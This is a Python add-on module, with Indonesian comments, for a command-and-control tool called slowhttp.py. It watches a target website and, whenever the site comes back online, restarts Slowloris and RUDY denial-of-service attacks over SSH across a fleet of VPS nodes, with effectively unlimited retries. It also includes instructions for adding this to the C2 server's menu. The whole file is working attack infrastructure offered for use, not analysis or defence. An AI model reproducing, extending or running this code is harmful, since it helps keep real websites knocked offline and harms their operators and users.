#!/usr/bin/env python3
"""
Auto-Recovery & Persistent Attack Module
Tambahkan ke slowhttp.py untuk fitur auto-recovery saat target down
"""

import socket
import time
import threading
import requests
from urllib.parse import urlparse
import logging

logger = logging.getLogger("AutoRecovery")

class AutoRecoveryManager:
    """
    Manager untuk menangani auto-recovery dan persistent attack
    Mendeteksi ketika target down dan otomatis melanjutkan serangan
    """
    
    def __init__(self, ssh_manager, db_manager):
        """Initialize auto-recovery manager"""
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.monitoring_threads = {}
        self.recovery_enabled = {}
        self.target_status = {}
        self.lock = threading.Lock()
        
    def enable_auto_recovery(self, session_id, target_url, vps_list, attack_type, parameters):
        """
        Enable auto-recovery untuk session tertentu
        
        Args:
            session_id: ID session attack
            target_url: URL target
            vps_list: List IP VPS yang digunakan
            attack_type: Tipe serangan (slowloris, rudy, etc)
            parameters: Parameter serangan
        """
        with self.lock:
            self.recovery_enabled[session_id] = {
                'target_url': target_url,
                'vps_list': vps_list,
                'attack_type': attack_type,
                'parameters': parameters,
                'enabled': True,
                'check_interval': 30,  # Check setiap 30 detik
                'recovery_delay': 60,  # Tunggu 60 detik sebelum restart
                'max_retries': 999,    # Unlimited retries
                'retry_count': 0
            }
            
            # Start monitoring thread
            if session_id not in self.monitoring_threads:
                thread = threading.Thread(
                    target=self._monitor_and_recover,
                    args=(session_id,),
                    daemon=True
                )
                thread.start()
                self.monitoring_threads[session_id] = thread
                
        logger.info(f"Auto-recovery enabled for session {session_id}")
        return True
    
    def disable_auto_recovery(self, session_id):
        """Disable auto-recovery untuk session"""
        with self.lock:
            if session_id in self.recovery_enabled:
                self.recovery_enabled[session_id]['enabled'] = False
                logger.info(f"Auto-recovery disabled for session {session_id}")
                return True
        return False
    
    def _monitor_and_recover(self, session_id):
        """
        Monitor target dan recover jika down
        Thread ini berjalan terus menerus untuk monitoring
        """
        logger.info(f"Starting auto-recovery monitor for session {session_id}")
        
        while True:
            try:
                # Check if recovery still enabled
                with self.lock:
                    if session_id not in self.recovery_enabled:
                        break
                    if not self.recovery_enabled[session_id]['enabled']:
                        break
                    
                    config = self.recovery_enabled[session_id]
                
                # Check target status
                target_url = config['target_url']
                is_down = self._check_target_down(target_url)
                
                # Update status
                with self.lock:
                    self.target_status[session_id] = {
                        'is_down': is_down,
                        'last_check': time.time(),
                        'url': target_url
                    }
                
                if is_down:
                    logger.warning(f"Target {target_url} is DOWN (ERR_CONNECTION_TIMED_OUT)")
                    logger.info(f"Waiting {config['recovery_delay']} seconds before recovery...")
                    
                    # Wait recovery delay
                    time.sleep(config['recovery_delay'])
                    
                    # Check if target back online
                    if self._check_target_online(target_url):
                        logger.info(f"Target {target_url} is back ONLINE!")
                        logger.info("Restarting attack...")
                        
                        # Restart attack on all VPS
                        self._restart_attack_on_vps(
                            session_id,
                            config['vps_list'],
                            config['attack_type'],
                            config['parameters']
                        )
                        
                        with self.lock:
                            config['retry_count'] += 1
                        
                        logger.info(f"Attack restarted successfully (retry #{config['retry_count']})")
                    else:
                        logger.warning(f"Target still down, will retry in {config['check_interval']} seconds")
                
                # Sleep before next check
                time.sleep(config['check_interval'])
                
            except Exception as e:
                logger.error(f"Error in auto-recovery monitor: {str(e)}")
                time.sleep(30)  # Wait before retry
    
    def _check_target_down(self, target_url):
        """
        Check apakah target down (ERR_CONNECTION_TIMED_OUT)
        
        Returns:
            True jika target down, False jika masih online
        """
        try:
            parsed = urlparse(target_url)
            host = parsed.netloc or parsed.path.split('/')[0]
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Method 1: Socket connection test
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            try:
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result != 0:
                    # Connection failed
                    return True
            except:
                return True
            
            # Method 2: HTTP request test
            try:
                response = requests.get(
                    target_url,
                    timeout=10,
                    allow_redirects=False,
                    verify=False
                )
                # Jika dapat response, target masih online
                return False
            except requests.exceptions.Timeout:
                return True
            except requests.exceptions.ConnectionError:
                return True
            except:
                # Other errors, assume still online
                return False
                
        except Exception as e:
            logger.error(f"Error checking target status: {str(e)}")
            return False
    
    def _check_target_online(self, target_url):
        """
        Check apakah target sudah kembali online
        Lebih thorough daripada _check_target_down
        """
        try:
            parsed = urlparse(target_url)
            host = parsed.netloc or parsed.path.split('/')[0]
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Try multiple times
            for attempt in range(3):
                try:
                    # Socket test
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    result = sock.connect_ex((host, port))
                    sock.close()
                    
                    if result == 0:
                        # HTTP test
                        response = requests.get(
                            target_url,
                            timeout=5,
                            allow_redirects=False,
                            verify=False
                        )
                        return True
                except:
                    pass
                
                time.sleep(2)
            
            return False
            
        except Exception as e:
            logger.error(f"Error checking if target online: {str(e)}")
            return False
    
    def _restart_attack_on_vps(self, session_id, vps_list, attack_type, parameters):
        """
        Restart attack pada semua VPS
        
        Args:
            session_id: ID session
            vps_list: List IP VPS
            attack_type: Tipe serangan
            parameters: Parameter serangan
        """
        logger.info(f"Restarting attack on {len(vps_list)} VPS nodes...")
        
        for vps_ip in vps_list:
            try:
                # Stop existing attack
                self._stop_attack_on_vps(vps_ip, session_id)
                
                # Wait a bit
                time.sleep(2)
                
                # Start new attack
                self._start_attack_on_vps(vps_ip, session_id, attack_type, parameters)
                
                logger.info(f"Attack restarted on {vps_ip}")
                
            except Exception as e:
                logger.error(f"Failed to restart attack on {vps_ip}: {str(e)}")
    
    def _stop_attack_on_vps(self, vps_ip, session_id):
        """Stop attack process pada VPS"""
        try:
            # Kill attack process
            kill_cmd = f"pkill -f 'python3 agent.py.*{session_id}'"
            success, output = self.ssh_manager.execute_command(
                vps_ip, 
                kill_cmd,
                timeout=10
            )
            
            if success:
                logger.info(f"Stopped attack on {vps_ip}")
            else:
                logger.warning(f"Failed to stop attack on {vps_ip}: {output}")
                
        except Exception as e:
            logger.error(f"Error stopping attack on {vps_ip}: {str(e)}")
    
    def _start_attack_on_vps(self, vps_ip, session_id, attack_type, parameters):
        """Start attack process pada VPS"""
        try:
            target = parameters.get('target', '')
            port = parameters.get('port', 80)
            connections = parameters.get('connections', 200)
            duration = parameters.get('duration', 3600)
            
            # Build attack command based on type
            if attack_type.lower() == 'slowloris':
                attack_cmd = f"""cd ~/slowhttp_agent && nohup python3 agent.py \\
                    --target {target} \\
                    --port {port} \\
                    --attack slowloris \\
                    --connections {connections} \\
                    --duration {duration} \\
                    --session-id {session_id} \\
                    > /dev/null 2>&1 &"""
                    
            elif attack_type.lower() == 'rudy':
                attack_cmd = f"""cd ~/slowhttp_agent && nohup python3 agent.py \\
                    --target {target} \\
                    --port {port} \\
                    --attack rudy \\
                    --connections {connections} \\
                    --duration {duration} \\
                    --session-id {session_id} \\
                    > /dev/null 2>&1 &"""
            else:
                logger.error(f"Unknown attack type: {attack_type}")
                return False
            
            # Execute command
            success, output = self.ssh_manager.execute_command(
                vps_ip,
                attack_cmd,
                timeout=10
            )
            
            if success:
                logger.info(f"Started {attack_type} attack on {vps_ip}")
                return True
            else:
                logger.error(f"Failed to start attack on {vps_ip}: {output}")
                return False
                
        except Exception as e:
            logger.error(f"Error starting attack on {vps_ip}: {str(e)}")
            return False
    
    def get_recovery_status(self, session_id):
        """Get status auto-recovery untuk session"""
        with self.lock:
            if session_id in self.recovery_enabled:
                config = self.recovery_enabled[session_id]
                status = self.target_status.get(session_id, {})
                
                return {
                    'enabled': config['enabled'],
                    'target_url': config['target_url'],
                    'retry_count': config['retry_count'],
                    'target_is_down': status.get('is_down', False),
                    'last_check': status.get('last_check', 0),
                    'check_interval': config['check_interval'],
                    'recovery_delay': config['recovery_delay']
                }
        return None
    
    def get_all_recovery_status(self):
        """Get status semua auto-recovery yang aktif"""
        with self.lock:
            result = {}
            for session_id in self.recovery_enabled:
                result[session_id] = self.get_recovery_status(session_id)
            return result


# ============================================
# INTEGRATION CODE - Tambahkan ke slowhttp.py
# ============================================

"""
CARA INTEGRASI KE slowhttp.py:

1. Import module ini di bagian atas slowhttp.py:
   from auto_recovery_patch import AutoRecoveryManager

2. Inisialisasi di class C2Server.__init__():
   self.auto_recovery = AutoRecoveryManager(self.ssh_manager, self.db_manager)

3. Tambahkan menu di interactive_menu():
   
   elif choice == '10':  # atau nomor menu yang sesuai
       self.auto_recovery_menu()

4. Tambahkan method baru di class C2Server:
"""

def auto_recovery_menu(self):
    """Menu untuk mengelola auto-recovery"""
    while True:
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}AUTO-RECOVERY & PERSISTENT ATTACK MENU{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"\n{Colors.GREEN}1.{Colors.RESET} Enable Auto-Recovery untuk Session")
        print(f"{Colors.GREEN}2.{Colors.RESET} Disable Auto-Recovery")
        print(f"{Colors.GREEN}3.{Colors.RESET} View Recovery Status")
        print(f"{Colors.GREEN}4.{Colors.RESET} View All Recovery Status")
        print(f"{Colors.RED}0.{Colors.RESET} Back to Main Menu")
        
        choice = input(f"\n{Colors.YELLOW}Select option: {Colors.RESET}").strip()
        
        if choice == '1':
            self._enable_auto_recovery()
        elif choice == '2':
            self._disable_auto_recovery()
        elif choice == '3':
            self._view_recovery_status()
        elif choice == '4':
            self._view_all_recovery_status()
        elif choice == '0':
            break

def _enable_auto_recovery(self):
    """Enable auto-recovery untuk session"""
    # Get active sessions
    sessions = self.db_manager.get_active_attack_sessions()
    
    if not sessions:
        print(f"\n{Colors.RED}No active attack sessions found{Colors.RESET}")
        return
    
    # Display sessions
    print(f"\n{Colors.CYAN}Active Attack Sessions:{Colors.RESET}")
    for i, session in enumerate(sessions, 1):
        print(f"{i}. Session: {session['session_name']} (ID: {session['id']})")
        print(f"   Target: {session['target_url']}")
        print(f"   Type: {session['attack_type']}")
    
    # Select session
    try:
        choice = int(input(f"\n{Colors.YELLOW}Select session number: {Colors.RESET}"))
        if 1 <= choice <= len(sessions):
            session = sessions[choice - 1]
            
            # Get VPS list
            vps_list = session['vps_nodes'].split(',')
            
            # Get parameters
            try:
                parameters = json.loads(session['parameters'])
            except:
                parameters = {}
            
            # Enable auto-recovery
            success = self.auto_recovery.enable_auto_recovery(
                session['id'],
                session['target_url'],
                vps_list,
                session['attack_type'],
                parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}✓ Auto-recovery enabled for session {session['id']}{Colors.RESET}")
                print(f"{Colors.CYAN}The attack will automatically restart if target goes down{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}✗ Failed to enable auto-recovery{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}Invalid selection{Colors.RESET}")
    except ValueError:
        print(f"\n{Colors.RED}Invalid input{Colors.RESET}")

def _disable_auto_recovery(self):
    """Disable auto-recovery untuk session"""
    session_id = input(f"\n{Colors.YELLOW}Enter session ID: {Colors.RESET}").strip()
    
    try:
        session_id = int(session_id)
        success = self.auto_recovery.disable_auto_recovery(session_id)
        
        if success:
            print(f"\n{Colors.GREEN}✓ Auto-recovery disabled for session {session_id}{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}✗ Session not found or already disabled{Colors.RESET}")
    except ValueError:
        print(f"\n{Colors.RED}Invalid session ID{Colors.RESET}")

def _view_recovery_status(self):
    """View recovery status untuk session tertentu"""
    session_id = input(f"\n{Colors.YELLOW}Enter session ID: {Colors.RESET}").strip()
    
    try:
        session_id = int(session_id)
        status = self.auto_recovery.get_recovery_status(session_id)
        
        if status:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}Auto-Recovery Status - Session {session_id}{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"\nEnabled: {Colors.GREEN if status['enabled'] else Colors.RED}{status['enabled']}{Colors.RESET}")
            print(f"Target URL: {status['target_url']}")
            print(f"Retry Count: {status['retry_count']}")
            print(f"Target Status: {Colors.RED if status['target_is_down'] else Colors.GREEN}{'DOWN' if status['target_is_down'] else 'ONLINE'}{Colors.RESET}")
            print(f"Last Check: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(status['last_check']))}")
            print(f"Check Interval: {status['check_interval']} seconds")
            print(f"Recovery Delay: {status['recovery_delay']} seconds")
        else:
            print(f"\n{Colors.RED}No auto-recovery configured for session {session_id}{Colors.RESET}")
    except ValueError:
        print(f"\n{Colors.RED}Invalid session ID{Colors.RESET}")

def _view_all_recovery_status(self):
    """View status semua auto-recovery yang aktif"""
    all_status = self.auto_recovery.get_all_recovery_status()
    
    if not all_status:
        print(f"\n{Colors.RED}No auto-recovery sessions active{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}All Auto-Recovery Sessions{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    
    for session_id, status in all_status.items():
        print(f"\n{Colors.YELLOW}Session {session_id}:{Colors.RESET}")
        print(f"  Target: {status['target_url']}")
        print(f"  Status: {Colors.GREEN if status['enabled'] else Colors.RED}{'ENABLED' if status['enabled'] else 'DISABLED'}{Colors.RESET}")
        print(f"  Target: {Colors.RED if status['target_is_down'] else Colors.GREEN}{'DOWN' if status['target_is_down'] else 'ONLINE'}{Colors.RESET}")
        print(f"  Retries: {status['retry_count']}")


"""
CARA ENABLE AUTO-RECOVERY SAAT START ATTACK:

Modifikasi method start_attack() di slowhttp.py untuk otomatis enable auto-recovery:
"""

def start_attack_with_auto_recovery(self, session_name, target_url, attack_type, vps_list, parameters):
    """Start attack dengan auto-recovery enabled"""
    
    # Start attack seperti biasa
    session_id = self.start_attack(session_name, target_url, attack_type, vps_list, parameters)
    
    if session_id:
        # Enable auto-recovery
        self.auto_recovery.enable_auto_recovery(
            session_id,
            target_url,
            vps_list,
            attack_type,
            parameters
        )
        
        print(f"\n{Colors.GREEN}✓ Auto-recovery enabled for this attack{Colors.RESET}")
        print(f"{Colors.CYAN}Attack will automatically restart if target goes down{Colors.RESET}")
    
    return session_id
